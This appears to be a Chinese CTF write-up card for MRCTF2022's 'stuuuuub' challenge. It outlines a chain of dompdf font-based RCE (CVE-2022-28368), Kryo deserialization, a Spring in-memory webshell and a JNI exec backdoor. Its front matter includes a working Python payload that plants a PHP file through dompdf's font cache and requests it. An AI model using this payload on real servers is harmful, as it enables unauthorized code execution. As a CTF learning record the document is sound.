---
title: MRCTF2022 后记 (与 stuuuuub 题解相同内容)
contest: MRCTF
year: 2022
difficulty: medium
vuln_type: web_unknown
tags: [dompdf 字体 RCE, Kryo 反序列化, Spring 内存马, JNI exec]
attack_chain: |
  1. 攻击链与 MRCTF2022 stuuuuub 题解完全相同：
     - dompdf CVE-2022-28368 字体 RCE (@font-face 远程字体 + md5 路径计算)
     - Kryo 反序列化 (Mocha.class + setReferences 等反射)
     - Spring RequestMappingHandlerMapping 内存马 (反射 urlLookup 注入)
     - JNI exec 后门 (popen + strcat)
key_payload: |
  # dompdf RCE (CVE-2022-28368):
  font_name = "eki"
  php_location = upload("exp.php", open("./exp.php", "rb").read())
  exp_css = f"""@font-face {{ font-family: '{font_name}'; src: url('http://localhost:81{php_location}'); }}"""
  css_location = upload("exp.css", exp_css)
  html = f"""<link rel=stylesheet href='http://localhost:81{css_location}'>"""
  html_location = upload("exp.html", html)
  print2pdf(html_location)
  md5helper = md5()
  md5helper.update(f"http://localhost:81{php_location}".encode())
  remote_path = f"/vendor/dompdf/dompdf/lib/fonts/{font_name}-normal_{md5helper.hexdigest()}.php"
  requests.get(url + remote_path)
one_liner: MRCTF2022 后记文，与 stuuuuub 题解内容重复：dompdf 字体 RCE + Kryo + Spring 内存马 + JNI exec。
lesson: |
  - 与 stuuuuub 完整 writeup 内容相同，建议合二为一
  - 详细分析见 MRCTF2022_stuuuuub_题解.meta.md
quality: low
---

# MRCTF2022 后记

> 来源: ctfiot.com 37649

**注：与 MRCTF2022 stuuuuub 题解内容完全相同。**

攻击链：

1. **dompdf 字体 RCE** (CVE-2022-28368) — `@font-face` 远程字体加载
2. **Kryo 反序列化** (Mocha.class)
3. **Spring RequestMappingHandlerMapping 内存马**
4. **JNI exec 后门** (popen + strcat)

完整 PoC 见 MRCTF2022 stuuuuub 题解。

## 评价

内容重复，建议合并到 stuuuuub 题解。质量低。
